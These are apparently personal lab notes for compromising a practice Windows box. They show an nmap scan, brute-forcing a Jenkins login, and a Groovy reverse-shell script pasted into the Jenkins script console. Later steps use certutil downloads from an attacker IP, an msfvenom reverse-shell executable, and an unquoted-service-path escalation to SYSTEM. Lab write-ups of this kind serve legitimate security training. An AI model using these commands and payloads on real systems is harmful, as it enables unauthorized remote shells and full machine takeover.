- nmap - open ports - 
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	5040/tcp  open  unknown
	8080/tcp  open  http          Jetty 9.4.41.v20210516

- we get a jenkins login page
- used burpsuite intruder to bruteforce login
	- jenkins:jenkins worked !!
- got access to jenkins profile
- exploited *script console* in *manage jenkins* using a *groovy reverse shell* 
	- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```
	  String host="localhost";
		int port=8044;
		String cmd="cmd.exe";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
	- changed host to my ip
	- set up a listener in port 8044
	- worked
- got access as butler/butler 
- `systeminfo`
- priv escalation using winpeas
	- start a python server in transfer folder
	- `certutil.exe -urlcache -f http://192.168.60.4/winpeas.exe winpeas.exe`
	- exploit *unquoted service path* in `C:\\Program Files (x86)\Wise\Wise Care 365\BootTime.exe`
	- here we can add a malicious `\Wise\wise.exe` and exploit it
- create a payload using msfvenom
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.60.4 LPORT=7777 -f exe > Wise.exe`
	- open a listener on 7777
	- goto `C:\Program Files (x86)\Wise` and put `Wise.exe` in there using `certutil.exe -urlcache -f http://192.168.60.4/Wise.exe Wise.exe`
	- we need Wise.exe to run as root 
	- so we stop it using `sc stop WiseBootAssistant` 
	- check status `sc query WiseBootAssisant`
	- then restart `sc start WiseBootAssisant`
	- a shell opens in :7777 with `nt authority\system` access.
	- SUCCESS